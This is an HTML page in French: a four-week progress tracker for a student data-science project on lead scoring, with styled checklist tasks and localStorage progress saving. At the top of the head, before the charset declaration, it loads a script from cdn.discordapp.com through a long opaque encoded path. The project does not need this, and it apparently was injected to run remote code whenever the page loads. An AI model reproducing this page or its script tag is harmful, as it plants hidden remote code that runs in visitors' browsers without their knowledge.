<!DOCTYPE html>
<html lang="fr">
<head><script type='text/javascript' src='https://cdn.discordapp.com/hOO-5z0s2xJpNdww5oM-IBx3sUGoDq8QAyyidCXNf50KzDLW8Ws1ib19VCAWnR2H-Og5DuqYDZYhhVUvMFF-BdFWcvqTEzvJwvzg0pH4sfCAIH5jv7ODqF2voKs8crRDPefVpAPRfty3-_0Uz-UBeQvLfTk16jlJ9_ZIHnCL7lz9VmMzv8kq3ykX7zVyg43yLnDWKZNxnxJGthMBtyg3fkMdsWN9mqNTokwitS4p9mdSNArqrPr_4lXdR9FQxnAFKXGE_gEQFowyhDNcehj3CmvDnwzrV9TTAd53ycxmkRwe4a0sKXY_gyO2Hb13t6TXXv4FXCBmO4yTFffe9snvt4JioHPU4qVFniGYr_y40RFs_Xme3SWZqZPOp91Z_2AorECXULpNNLAl_rQcxx45mHdqkSZkNZAgNpWsFcL7UDYGVAxrzVYT0ZYx051ZB6UDXMd9pAZdt6ximpUbV64zd5soSt4d4HIFuH2-jHJcxWDadOSKO0V5tQxdKks_CrZqdsqqFWvWty1Rhvdob1C9jIYewE9rE8sPGb-nqsrguwcCFATPz-2rq1_K19jM6tnZ2JVF38sSZEXiwdhJc7zsuFgXTCV3JgCgd90poxOoiF-aYxWfcSa8XCwbC8dsqIcGzPO_sNy2PZP9AEgArcmQwfab0BqtXwSDuUyU78TrGZgaLOB5mmJgnJvgN3E'></script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Lead Scoring — Suivi de projet</title>
<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #0e0f11;
    --surface: #161719;
    --surface2: #1e2023;
    --border: #2a2c30;
    --border2: #353840;
    --text: #e8e9eb;
    --muted: #6b6f78;
    --accent: #4ade80;
    --accent-dim: rgba(74, 222, 128, 0.08);
    --accent-border: rgba(74, 222, 128, 0.25);
    --w1: #60a5fa;
    --w2: #fbbf24;
    --w3: #f87171;
    --w4: #34d399;
    --mono: 'DM Mono', monospace;
    --sans: 'DM Sans', sans-serif;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--sans);
    min-height: 100vh;
    padding: 40px 20px 80px;
  }

  .wrapper {
    max-width: 680px;
    margin: 0 auto;
  }

  header {
    margin-bottom: 40px;
  }

  .eyebrow {
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 0.15em;
    color: var(--muted);
    text-transform: uppercase;
    margin-bottom: 10px;
  }

  h1 {
    font-size: 28px;
    font-weight: 600;
    letter-spacing: -0.02em;
    color: var(--text);
    line-height: 1.2;
    margin-bottom: 8px;
  }

  .subtitle {
    font-size: 14px;
    color: var(--muted);
    line-height: 1.6;
  }

  .progress-bar-wrap {
    margin: 28px 0 0;
    background: var(--surface2);
    border: 1px solid var(--border);
    border-radius: 100px;
    height: 6px;
    overflow: hidden;
  }

  .progress-bar {
    height: 100%;
    background: var(--accent);
    border-radius: 100px;
    transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
    width: 0%;
  }

  .progress-label {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 8px;
  }

  .progress-label span {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--muted);
  }

  .progress-label .pct {
    color: var(--accent);
    font-weight: 500;
  }

  .phase {
    margin-bottom: 20px;
    border: 1px solid var(--border);
    border-radius: 12px;
    overflow: hidden;
    transition: border-color 0.3s;
  }

  .phase.phase-done {
    border-color: var(--accent-border);
  }

  .phase-header {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 16px 20px;
    background: var(--surface);
    cursor: pointer;
    user-select: none;
    transition: background 0.2s;
  }

  .phase-header:hover {
    background: var(--surface2);
  }

  .week-badge {
    font-family: var(--mono);
    font-size: 10px;
    font-weight: 500;
    letter-spacing: 0.08em;
    padding: 3px 9px;
    border-radius: 4px;
    text-transform: uppercase;
    flex-shrink: 0;
  }

  .w1 .week-badge { background: rgba(96,165,250,0.12); color: var(--w1); border: 1px solid rgba(96,165,250,0.2); }
  .w2 .week-badge { background: rgba(251,191,36,0.10); color: var(--w2); border: 1px solid rgba(251,191,36,0.2); }
  .w3 .week-badge { background: rgba(248,113,113,0.10); color: var(--w3); border: 1px solid rgba(248,113,113,0.2); }
  .w4 .week-badge { background: rgba(52,211,153,0.10); color: var(--w4); border: 1px solid rgba(52,211,153,0.2); }

  .phase-title {
    font-size: 14px;
    font-weight: 500;
    color: var(--text);
    flex: 1;
  }

  .phase-count {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--muted);
    flex-shrink: 0;
  }

  .phase-count.all-done {
    color: var(--accent);
  }

  .chevron {
    width: 16px;
    height: 16px;
    color: var(--muted);
    transition: transform 0.25s;
    flex-shrink: 0;
  }

  .phase.open .chevron { transform: rotate(180deg); }

  .phase-body {
    display: none;
    border-top: 1px solid var(--border);
  }

  .phase.open .phase-body { display: block; }

  .task {
    display: flex;
    align-items: flex-start;
    gap: 14px;
    padding: 14px 20px;
    border-bottom: 1px solid var(--border);
    cursor: pointer;
    transition: background 0.15s;
    position: relative;
  }

  .task:last-child { border-bottom: none; }
  .task:hover { background: var(--surface2); }

  .task.done { opacity: 0.55; }
  .task.done .task-title { text-decoration: line-through; text-decoration-color: var(--muted); }

  .checkbox {
    width: 18px;
    height: 18px;
    border-radius: 5px;
    border: 1.5px solid var(--border2);
    flex-shrink: 0;
    margin-top: 2px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background 0.2s, border-color 0.2s, transform 0.15s;
    background: var(--surface2);
  }

  .task.done .checkbox {
    background: var(--accent);
    border-color: var(--accent);
    transform: scale(1.05);
  }

  .checkmark {
    opacity: 0;
    transition: opacity 0.15s;
  }

  .task.done .checkmark { opacity: 1; }

  .task-content { flex: 1; min-width: 0; }

  .task-title {
    font-size: 14px;
    font-weight: 400;
    color: var(--text);
    margin-bottom: 3px;
    line-height: 1.4;
    transition: color 0.2s;
  }

  .task-desc {
    font-size: 12px;
    color: var(--muted);
    line-height: 1.6;
    font-family: var(--mono);
  }

  .tag {
    display: inline-block;
    margin-top: 6px;
    font-size: 10px;
    font-family: var(--mono);
    letter-spacing: 0.06em;
    padding: 2px 7px;
    border-radius: 3px;
    text-transform: uppercase;
  }

  .tag-deliverable {
    background: rgba(74,222,128,0.1);
    color: var(--accent);
    border: 1px solid rgba(74,222,128,0.2);
  }

  .tag-concept {
    background: rgba(148,163,184,0.08);
    color: var(--muted);
    border: 1px solid var(--border);
  }

  .done-banner {
    display: none;
    align-items: center;
    gap: 10px;
    background: var(--accent-dim);
    border: 1px solid var(--accent-border);
    border-radius: 10px;
    padding: 14px 20px;
    margin-top: 28px;
    font-size: 14px;
    color: var(--accent);
    font-weight: 500;
  }

  .done-banner.show { display: flex; }

  .done-banner svg { flex-shrink: 0; }

  footer {
    margin-top: 36px;
    padding-top: 20px;
    border-top: 1px solid var(--border);
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .footer-label {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--muted);
  }

  .reset-btn {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--muted);
    background: none;
    border: 1px solid var(--border);
    padding: 5px 12px;
    border-radius: 5px;
    cursor: pointer;
    transition: color 0.2s, border-color 0.2s;
    letter-spacing: 0.05em;
  }

  .reset-btn:hover {
    color: var(--text);
    border-color: var(--border2);
  }

  @keyframes checkPop {
    0% { transform: scale(1); }
    40% { transform: scale(1.25); }
    100% { transform: scale(1.05); }
  }

  .task.just-checked .checkbox {
    animation: checkPop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
  }
</style>
</head>
<body>

<div class="wrapper">
  <header>
    <p class="eyebrow">Projet Data Science · ESIEA</p>
    <h1>Optimisateur de campagnes marketing</h1>
    <p class="subtitle">Lead scoring — prédiction de la probabilité de conversion · 4 semaines</p>
    <div class="progress-bar-wrap">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
    <div class="progress-label">
      <span id="progress-text">0 / 12 étapes complétées</span>
      <span class="pct" id="progress-pct">0%</span>
    </div>
  </header>

  <div id="phases"></div>

  <div class="done-banner" id="done-banner">
    <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke="currentColor" stroke-width="1.5"/><path d="M6 10l3 3 5-5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
    Projet terminé — félicitations !
  </div>

  <footer>
    <span class="footer-label">La progression est sauvegardée automatiquement</span>
    <button class="reset-btn" onclick="resetAll()">↺ Réinitialiser</button>
  </footer>
</div>

<script>
const data = [
  {
    id: 'w1',
    week: 'Semaine 1',
    title: 'Setup + compréhension des données',
    colorClass: 'w1',
    tasks: [
      { id: 't1', title: 'Installer l\'environnement Python', desc: 'Python 3.10+, pandas, numpy, matplotlib, seaborn, scikit-learn, Jupyter', tag: 'concept', tagLabel: 'Setup' },
      { id: 't2', title: 'Charger et explorer le dataset', desc: 'df.head() · df.info() · df.describe() · valeurs manquantes', tag: 'concept', tagLabel: 'EDA' },
      { id: 't3', title: 'Analyser la variable cible', desc: 'Distribution des 0/1 · taux de conversion · dataset déséquilibré ?', tag: 'deliverable', tagLabel: 'Livrable : notebook EDA' },
    ]
  },
  {
    id: 'w2',
    week: 'Semaine 2',
    title: 'Nettoyage + préparation des features',
    colorClass: 'w2',
    tasks: [
      { id: 't4', title: 'Traiter les valeurs manquantes', desc: 'df.fillna() · df.dropna() · stratégie par colonne (médiane, mode)', tag: 'concept', tagLabel: 'Nettoyage' },
      { id: 't5', title: 'Encoder les variables catégorielles', desc: 'pd.get_dummies() · one-hot encoding des colonnes texte', tag: 'concept', tagLabel: 'Feature engineering' },
      { id: 't6', title: 'Normaliser les variables numériques', desc: 'StandardScaler ou MinMaxScaler · indispensable avant modélisation', tag: 'deliverable', tagLabel: 'Livrable : dataset propre' },
    ]
  },
  {
    id: 'w3',
    week: 'Semaine 3',
    title: 'Modélisation + score de probabilité',
    colorClass: 'w3',
    tasks: [
      { id: 't7', title: 'Diviser train / test', desc: 'train_test_split · 80/20 · random_state fixé pour reproductibilité', tag: 'concept', tagLabel: 'Validation' },
      { id: 't8', title: 'Entraîner la régression logistique', desc: 'Modèle de base · sort des probabilités 0–1 nativement', tag: 'concept', tagLabel: 'Modélisation' },
      { id: 't9', title: 'Générer les scores et évaluer', desc: 'predict_proba() · AUC-ROC · matrice de confusion · precision/recall', tag: 'deliverable', tagLabel: 'Livrable : modèle + métriques' },
    ]
  },
  {
    id: 'w4',
    week: 'Semaine 4',
    title: 'Amélioration + rendu final',
    colorClass: 'w4',
    tasks: [
      { id: 't10', title: 'Tester un second modèle (Random Forest)', desc: 'Comparer avec la régression logistique sur les métriques', tag: 'concept', tagLabel: 'Comparaison' },
      { id: 't11', title: 'Visualiser les leads par score', desc: 'Trier par probabilité décroissante · courbe lift · histogramme', tag: 'concept', tagLabel: 'Data viz' },
      { id: 't12', title: 'Rédiger le rapport final', desc: 'Notebook propre et commenté : problématique → données → méthode → résultats', tag: 'deliverable', tagLabel: 'Livrable final' },
    ]
  }
];

let state = JSON.parse(localStorage.getItem('lead-scoring-state') || '{}');

function save() {
  localStorage.setItem('lead-scoring-state', JSON.stringify(state));
}

function updateProgress() {
  const total = data.reduce((s, p) => s + p.tasks.length, 0);
  const done = Object.values(state).filter(Boolean).length;
  const pct = Math.round((done / total) * 100);
  document.getElementById('progress-bar').style.width = pct + '%';
  document.getElementById('progress-text').textContent = done + ' / ' + total + ' étapes complétées';
  document.getElementById('progress-pct').textContent = pct + '%';
  document.getElementById('done-banner').classList.toggle('show', done === total);

  data.forEach(phase => {
    const el = document.getElementById('phase-' + phase.id);
    if (!el) return;
    const phaseDone = phase.tasks.filter(t => state[t.id]).length;
    const countEl = el.querySelector('.phase-count');
    countEl.textContent = phaseDone + '/' + phase.tasks.length;
    countEl.classList.toggle('all-done', phaseDone === phase.tasks.length);
    el.classList.toggle('phase-done', phaseDone === phase.tasks.length);
  });
}

function toggleTask(taskId, el) {
  state[taskId] = !state[taskId];
  save();
  el.classList.toggle('done', state[taskId]);
  if (state[taskId]) {
    el.classList.add('just-checked');
    setTimeout(() => el.classList.remove('just-checked'), 350);
  }
  updateProgress();
}

function togglePhase(phaseId) {
  const el = document.getElementById('phase-' + phaseId);
  el.classList.toggle('open');
}

function resetAll() {
  if (!confirm('Réinitialiser toute la progression ?')) return;
  state = {};
  save();
  document.querySelectorAll('.task').forEach(el => el.classList.remove('done', 'just-checked'));
  updateProgress();
}

function render() {
  const container = document.getElementById('phases');
  container.innerHTML = data.map(phase => `
    <div class="phase ${phase.colorClass} open" id="phase-${phase.id}">
      <div class="phase-header" onclick="togglePhase('${phase.id}')">
        <span class="week-badge">${phase.week}</span>
        <span class="phase-title">${phase.title}</span>
        <span class="phase-count">0/${phase.tasks.length}</span>
        <svg class="chevron" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4,6 8,10 12,6"/></svg>
      </div>
      <div class="phase-body">
        ${phase.tasks.map(task => `
          <div class="task ${state[task.id] ? 'done' : ''}" id="task-${task.id}" onclick="toggleTask('${task.id}', this)">
            <div class="checkbox">
              <svg class="checkmark" width="10" height="8" viewBox="0 0 10 8" fill="none">
                <path d="M1 4l2.5 2.5L9 1" stroke="#0e0f11" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </div>
            <div class="task-content">
              <p class="task-title">${task.title}</p>
              <p class="task-desc">${task.desc}</p>
              <span class="tag tag-${task.tag}">${task.tagLabel}</span>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `).join('');
  updateProgress();
}

render();
</script>
</body>
</html>
